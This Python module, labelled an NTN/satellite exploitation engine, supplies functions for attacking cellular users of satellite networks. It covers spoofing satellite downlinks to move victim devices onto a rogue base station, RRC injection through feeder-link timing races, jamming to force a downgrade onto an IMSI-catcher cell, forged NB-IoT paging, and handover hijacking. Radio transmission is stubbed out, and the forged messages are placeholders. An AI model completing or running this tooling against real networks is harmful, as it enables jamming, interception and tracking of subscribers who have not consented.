"""
FalconOne NTN/Satellite Exploitation Module (v1.5.2)
Targets: 3GPP Rel-19 gNB-on-satellite, NB-IoT NTN, LEO/GEO handovers
Author: FalconOne Development Team
"""

import logging
import numpy as np
from typing import Dict, Any, List, Optional, Tuple
from datetime import datetime, timedelta
import math

try:
    from ..utils.logger import ModuleLogger
except ImportError:
    class ModuleLogger:
        def __init__(self, name, parent):
            self.logger = logging.getLogger(name) if parent is None else parent.getChild(name)
        def info(self, msg, **kw): self.logger.info(f"{msg} {kw if kw else ''}")
        def warning(self, msg, **kw): self.logger.warning(f"{msg} {kw if kw else ''}")
        def error(self, msg, **kw): self.logger.error(f"{msg} {kw if kw else ''}")
        def debug(self, msg, **kw): self.logger.debug(f"{msg} {kw if kw else ''}")


class SatelliteEphemeris:
    """Satellite orbital parameters and tracking"""
    
    def __init__(self, sat_id: str, orbit_type: str, altitude_km: float, 
                 inclination_deg: float, tle_line1: str = None, tle_line2: str = None):
        self.sat_id = sat_id
        self.orbit_type = orbit_type  # LEO, GEO, MEO
        self.altitude_km = altitude_km
        self.inclination_deg = inclination_deg
        self.tle_line1 = tle_line1
        self.tle_line2 = tle_line2
        
    def calculate_doppler_shift(self, carrier_freq_hz: float, elevation_deg: float) -> float:
        """
        Calculate Doppler shift for LEO satellite
        
        Args:
            carrier_freq_hz: Carrier frequency (e.g., 2.1 GHz for 5G NTN)
            elevation_deg: Elevation angle to satellite
            
        Returns:
            Doppler shift in Hz
        """
        # Simplified Doppler calculation (assumes circular orbit)
        earth_radius_km = 6371
        orbital_velocity_kmps = math.sqrt(398600 / (earth_radius_km + self.altitude_km))  # GM_earth = 398600 km^3/s^2
        
        # Radial velocity component
        radial_velocity_kmps = orbital_velocity_kmps * math.cos(math.radians(elevation_deg))
        
        # Doppler shift: f_d = f_c * (v/c)
        c_kmps = 299792.458  # Speed of light
        doppler_shift_hz = carrier_freq_hz * (radial_velocity_kmps / c_kmps)
        
        return doppler_shift_hz
    
    def calculate_propagation_delay(self, elevation_deg: float) -> float:
        """
        Calculate signal propagation delay
        
        Args:
            elevation_deg: Elevation angle to satellite
            
        Returns:
            Propagation delay in milliseconds
        """
        earth_radius_km = 6371
        # Slant range to satellite
        slant_range_km = math.sqrt(
            (earth_radius_km + self.altitude_km)**2 - 
            (earth_radius_km * math.cos(math.radians(elevation_deg)))**2
        ) - earth_radius_km * math.sin(math.radians(elevation_deg))
        
        # Delay = distance / speed_of_light
        c_kmps = 299792.458
        delay_ms = (slant_range_km / c_kmps) * 1000
        
        return delay_ms


class NTNExploitEngine:
    """
    Non-Terrestrial Network attack vectors
    Requires: OAI/srsRAN with NTN extensions, satellite ephemeris data
    """
    
    def __init__(self, config, logger: Optional[logging.Logger] = None):
        self.config = config
        
        # Handle logger initialization
        if logger is None:
            logger = logging.getLogger('FalconOne')
        self.logger = ModuleLogger('Exploit-NTN', logger)
        
        # Satellite database (ephemeris cache)
        self.satellite_db: Dict[str, SatelliteEphemeris] = {}
        
        # Attack configuration
        self.ntn_enabled = config.get('exploit.ntn.enabled', True) if hasattr(config, 'get') else True
        self.spoof_power_dbm = config.get('exploit.ntn.spoof_power_dbm', 30) if hasattr(config, 'get') else 30
        
        # Track active attacks
        self.active_attacks = []
        
        self.logger.info("NTN Exploitation Engine initialized (v1.5.2)", 
                       ntn_enabled=self.ntn_enabled)
    
    def register_satellite(self, sat_id: str, orbit_type: str, altitude_km: float, 
                          inclination_deg: float, tle_line1: str = None, tle_line2: str = None):
        """
        Register a satellite in the ephemeris database
        
        Args:
            sat_id: Satellite identifier (e.g., 'Starlink-1234')
            orbit_type: 'LEO', 'GEO', or 'MEO'
            altitude_km: Orbital altitude in km
            inclination_deg: Orbital inclination in degrees
            tle_line1: TLE line 1 (optional)
            tle_line2: TLE line 2 (optional)
        """
        ephemeris = SatelliteEphemeris(sat_id, orbit_type, altitude_km, inclination_deg, tle_line1, tle_line2)
        self.satellite_db[sat_id] = ephemeris
        self.logger.info(f"Registered satellite: {sat_id} ({orbit_type}, {altitude_km} km)")
    
    def spoof_satellite_downlink(self, target_ue: str, sat_id: str, 
                                 elevation_deg: float = 45.0, 
                                 carrier_freq_hz: float = 2.1e9) -> Dict[str, Any]:
        """
        Spoof LEO satellite downlink to force UE handover to rogue gNB
        Exploits Rel-19 transparent payload timing vulnerabilities
        
        Args:
            target_ue: IMSI/SUCI of victim UE
            sat_id: Satellite ID to spoof
            elevation_deg: Simulated elevation angle
            carrier_freq_hz: Carrier frequency (default 2.1 GHz)
            
        Returns:
            Attack result dictionary
        """
        if sat_id not in self.satellite_db:
            self.logger.error(f"Satellite {sat_id} not in database")
            return {'success': False, 'reason': 'satellite_not_found'}
        
        ephemeris = self.satellite_db[sat_id]
        
        # Calculate required parameters
        doppler_shift = ephemeris.calculate_doppler_shift(carrier_freq_hz, elevation_deg)
        propagation_delay = ephemeris.calculate_propagation_delay(elevation_deg)
        
        self.logger.warning(f"Spoofing {sat_id} downlink for UE {target_ue}",
                          doppler=f"{doppler_shift:.2f} Hz",
                          delay=f"{propagation_delay:.2f} ms")
        
        # Attack execution (pseudo-code for OAI/srsRAN integration)
        attack_params = {
            'attack_type': 'satellite_downlink_spoof',
            'target_ue': target_ue,
            'sat_id': sat_id,
            'carrier_freq_hz': carrier_freq_hz,
            'doppler_shift_hz': doppler_shift,
            'propagation_delay_ms': propagation_delay,
            'tx_power_dbm': self.spoof_power_dbm,
            'timestamp': datetime.now().isoformat()
        }
        
        # Simulated attack execution
        # In real implementation: Use OAI/srsRAN to transmit forged SSB with satellite timing
        success = self._execute_ntn_spoof(attack_params)
        
        if success:
            self.active_attacks.append(attack_params)
            self.logger.info(f"Satellite spoof successful: {target_ue} -> rogue gNB")
        
        return {
            'success': success,
            'attack_params': attack_params,
            'victim_ue': target_ue,
            'spoofed_satellite': sat_id
        }
    
    def exploit_feeder_link_delay(self, target_cell_id: int, sat_id: str) -> Dict[str, Any]:
        """
        Exploit feeder link delay to inject malicious RRC messages
        Target: gNB-on-satellite with >250ms RTT
        
        Args:
            target_cell_id: Target cell ID (gNB-on-satellite)
            sat_id: Satellite ID hosting the gNB
            
        Returns:
            Attack result dictionary
        """
        if sat_id not in self.satellite_db:
            return {'success': False, 'reason': 'satellite_not_found'}
        
        ephemeris = self.satellite_db[sat_id]
        
        # Check if delay is exploitable (GEO satellites have ~250-280ms delay)
        if ephemeris.orbit_type != 'GEO' and ephemeris.altitude_km < 20000:
            self.logger.warning(f"Feeder link delay too low for {sat_id} ({ephemeris.orbit_type})")
            return {'success': False, 'reason': 'insufficient_delay'}
        
        propagation_delay = ephemeris.calculate_propagation_delay(90)  # Worst case (overhead)
        
        self.logger.warning(f"Exploiting feeder link delay for cell {target_cell_id}",
                          sat_id=sat_id,
                          delay=f"{propagation_delay:.2f} ms")
        
        # Race condition attack: Inject RRC reconfiguration before legitimate message arrives
        attack_params = {
            'attack_type': 'feeder_link_race_condition',
            'target_cell_id': target_cell_id,
            'sat_id': sat_id,
            'feeder_delay_ms': propagation_delay,
            'injection_timing': propagation_delay * 0.7,  # Inject at 70% of legitimate delay
            'timestamp': datetime.now().isoformat()
        }
        
        success = self._execute_feeder_link_attack(attack_params)
        
        if success:
            self.active_attacks.append(attack_params)
            self.logger.info(f"Feeder link exploit successful: Cell {target_cell_id}")
        
        return {
            'success': success,
            'attack_params': attack_params,
            'target_cell': target_cell_id
        }
    
    def downgrade_ntn_to_terrestrial(self, target_ue: str, rogue_cell_id: int) -> Dict[str, Any]:
        """
        Force NTN UE to connect to rogue terrestrial BTS (IMSI catcher variant)
        Exploits dual-mode (satellite/terrestrial) capability
        
        Args:
            target_ue: IMSI/SUCI of victim UE
            rogue_cell_id: Cell ID of rogue terrestrial gNB
            
        Returns:
            Attack result dictionary
        """
        self.logger.warning(f"Forcing NTN→terrestrial downgrade for {target_ue}",
                          rogue_cell=rogue_cell_id)
        
        # Attack strategy:
        # 1. Jam satellite beam (if capable)
        # 2. Broadcast terrestrial cell with higher priority
        # 3. Force UE to camp on rogue cell
        
        attack_params = {
            'attack_type': 'ntn_to_terrestrial_downgrade',
            'target_ue': target_ue,
            'rogue_cell_id': rogue_cell_id,
            'jam_satellite': True,
            'terrestrial_priority': 7,  # Max priority
            'timestamp': datetime.now().isoformat()
        }
        
        success = self._execute_downgrade_attack(attack_params)
        
        if success:
            self.active_attacks.append(attack_params)
            self.logger.info(f"Downgrade successful: {target_ue} -> Cell {rogue_cell_id}")
        
        return {
            'success': success,
            'attack_params': attack_params,
            'victim_ue': target_ue,
            'rogue_cell': rogue_cell_id
        }
    
    def exploit_nb_iot_ntn(self, target_ue: str, sat_id: str) -> Dict[str, Any]:
        """
        Exploit NB-IoT NTN direct-to-satellite IoT communications
        Targets Rel-17/19 NB-IoT satellite extensions
        
        Args:
            target_ue: IoT device IMSI
            sat_id: Satellite ID for NB-IoT service
            
        Returns:
            Attack result dictionary
        """
        if sat_id not in self.satellite_db:
            return {'success': False, 'reason': 'satellite_not_found'}
        
        self.logger.warning(f"Exploiting NB-IoT NTN for device {target_ue}",
                          sat_id=sat_id)
        
        # NB-IoT specific attack vectors
        attack_params = {
            'attack_type': 'nb_iot_ntn_exploit',
            'target_ue': target_ue,
            'sat_id': sat_id,
            'narrowband_index': 0,  # 180 kHz narrowband
            'repetition_level': 128,  # Max repetitions for coverage
            'timestamp': datetime.now().isoformat()
        }
        
        # Execute attack (spoof NB-IoT downlink with forged paging)
        success = self._execute_nb_iot_attack(attack_params)
        
        if success:
            self.active_attacks.append(attack_params)
            self.logger.info(f"NB-IoT NTN exploit successful: {target_ue}")
        
        return {
            'success': success,
            'attack_params': attack_params,
            'victim_device': target_ue
        }
    
    def inter_satellite_handover_hijack(self, target_ue: str, 
                                       legitimate_sat: str, 
                                       rogue_sat: str) -> Dict[str, Any]:
        """
        Hijack inter-satellite handover to redirect UE to rogue satellite
        Exploits handover preparation timing vulnerabilities
        
        Args:
            target_ue: IMSI/SUCI of victim UE
            legitimate_sat: Current serving satellite
            rogue_sat: Attacker-controlled satellite (or ground station spoofing satellite)
            
        Returns:
            Attack result dictionary
        """
        self.logger.warning(f"Hijacking inter-satellite handover: {target_ue}",
                          from_sat=legitimate_sat,
                          to_sat=rogue_sat)
        
        attack_params = {
            'attack_type': 'inter_satellite_handover_hijack',
            'target_ue': target_ue,
            'legitimate_sat': legitimate_sat,
            'rogue_sat': rogue_sat,
            'handover_prep_time_ms': 50,  # Faster than legitimate (100ms)
            'timestamp': datetime.now().isoformat()
        }
        
        success = self._execute_handover_hijack(attack_params)
        
        if success:
            self.active_attacks.append(attack_params)
            self.logger.info(f"Handover hijack successful: {target_ue} -> {rogue_sat}")
        
        return {
            'success': success,
            'attack_params': attack_params,
            'victim_ue': target_ue,
            'redirected_to': rogue_sat
        }
    
    def get_active_attacks(self) -> List[Dict[str, Any]]:
        """Get list of active NTN attacks"""
        return self.active_attacks
    
    def stop_attack(self, attack_id: int) -> bool:
        """Stop a specific attack by index"""
        if 0 <= attack_id < len(self.active_attacks):
            attack = self.active_attacks.pop(attack_id)
            self.logger.info(f"Stopped attack: {attack['attack_type']}")
            return True
        return False
    
    # ==================== PRIVATE ATTACK EXECUTION METHODS ====================
    
    def _execute_ntn_spoof(self, params: Dict[str, Any]) -> bool:
        """
        Execute satellite downlink spoofing
        In production: Integrate with OAI/srsRAN NTN branch
        """
        # Placeholder for actual SDR/OAI integration
        self.logger.debug(f"Executing NTN spoof with params: {params}")
        
        # Basic implementation: Generate forged SSB with malicious parameters
        try:
            # Generate forged SSB (Synchronization Signal Block)
            forged_ssb = self._generate_forged_ssb(params)
            
            # In production: Call OAI gNB API to transmit forged SSB
            # self.oai_client.transmit_ssb(forged_ssb)
            
            self.logger.info("NTN downlink spoofing executed (simulated)")
            return True
        except Exception as e:
            self.logger.error(f"NTN spoof failed: {e}")
            return False
    
    def _execute_feeder_link_attack(self, params: Dict[str, Any]) -> bool:
        """Execute feeder link race condition attack"""
        self.logger.debug(f"Executing feeder link attack: {params}")
        
        try:
            # Generate malicious RRC messages with timing offset
            malicious_rrc = self._generate_malicious_rrc(params)
            
            # Apply timing offset for race condition
            timing_offset = params.get('timing_offset', 0.001)  # 1ms default
            
            # In production: Inject via SDR with precise timing
            # self.sdr_transmit(malicious_rrc, timing_offset)
            
            self.logger.info(f"Feeder link attack executed with {timing_offset}s offset (simulated)")
            return True
        except Exception as e:
            self.logger.error(f"Feeder link attack failed: {e}")
            return False
    
    def _execute_downgrade_attack(self, params: Dict[str, Any]) -> bool:
        """Execute NTN-to-terrestrial downgrade attack"""
        self.logger.debug(f"Executing downgrade attack: {params}")
        
        try:
            # Jam satellite signal (simulated)
            satellite_freq = params.get('satellite_freq', 2140000000)  # Default L-band
            self._jam_satellite_signal(satellite_freq)
            
            # Broadcast rogue terrestrial cell
            terrestrial_freq = params.get('terrestrial_freq', 2140000000)
            self._broadcast_rogue_cell(terrestrial_freq)
            
            self.logger.info("NTN-to-terrestrial downgrade attack executed (simulated)")
            return True
        except Exception as e:
            self.logger.error(f"Downgrade attack failed: {e}")
            return False
    
    def _execute_nb_iot_attack(self, params: Dict[str, Any]) -> bool:
        """Execute NB-IoT NTN exploit"""
        self.logger.debug(f"Executing NB-IoT attack: {params}")
        
        try:
            # Generate forged NB-IoT paging message
            forged_identity = params.get('forged_identity', '0011223344556677')
            paging_msg = self._generate_nb_iot_paging(forged_identity)
            
            # Transmit forged paging (simulated)
            # self.sdr_transmit(paging_msg, frequency=800000000)  # 800MHz NB-IoT
            
            self.logger.info(f"NB-IoT attack executed with identity {forged_identity} (simulated)")
            return True
        except Exception as e:
            self.logger.error(f"NB-IoT attack failed: {e}")
            return False
    
    def _execute_handover_hijack(self, params: Dict[str, Any]) -> bool:
        """Execute inter-satellite handover hijack"""
        self.logger.debug(f"Executing handover hijack: {params}")
        
        try:
            # Race legitimate handover command
            handover_cmd = self._generate_malicious_handover(params)
            
            # Transmit with minimal timing offset to beat legitimate command
            race_timing = params.get('race_timing', 0.0001)  # 100μs
            
            # self.sdr_transmit(handover_cmd, timing_offset=race_timing)
            
            self.logger.info(f"Handover hijack executed with {race_timing}s race timing (simulated)")
            return True
        except Exception as e:
            self.logger.error(f"Handover hijack failed: {e}")
            return False
    
    def generate_attack_report(self) -> Dict[str, Any]:
        """Generate comprehensive NTN attack report"""
        return {
            'total_attacks': len(self.active_attacks),
            'attack_types': [a['attack_type'] for a in self.active_attacks],
            'active_attacks': self.active_attacks,
            'satellites_tracked': len(self.satellite_db),
            'timestamp': datetime.now().isoformat()
        }
    
    def _generate_forged_ssb(self, params: Dict[str, Any]) -> bytes:
        """Generate forged Synchronization Signal Block"""
        # Placeholder implementation
        return b'forged_ssb_data'
    
    def _generate_malicious_rrc(self, params: Dict[str, Any]) -> bytes:
        """Generate malicious RRC message"""
        # Placeholder implementation
        return b'malicious_rrc_data'
    
    def _jam_satellite_signal(self, frequency: int) -> None:
        """Jam satellite signal (simulated)"""
        self.logger.debug(f"Jamming satellite at {frequency}Hz")
    
    def _broadcast_rogue_cell(self, frequency: int) -> None:
        """Broadcast rogue terrestrial cell (simulated)"""
        self.logger.debug(f"Broadcasting rogue cell at {frequency}Hz")
    
    def _generate_nb_iot_paging(self, identity: str) -> bytes:
        """Generate NB-IoT paging message"""
        # Placeholder implementation
        return f'nb_iot_paging_{identity}'.encode()
    
    def _generate_malicious_handover(self, params: Dict[str, Any]) -> bytes:
        """Generate malicious handover command"""
        # Placeholder implementation
        return b'malicious_handover'
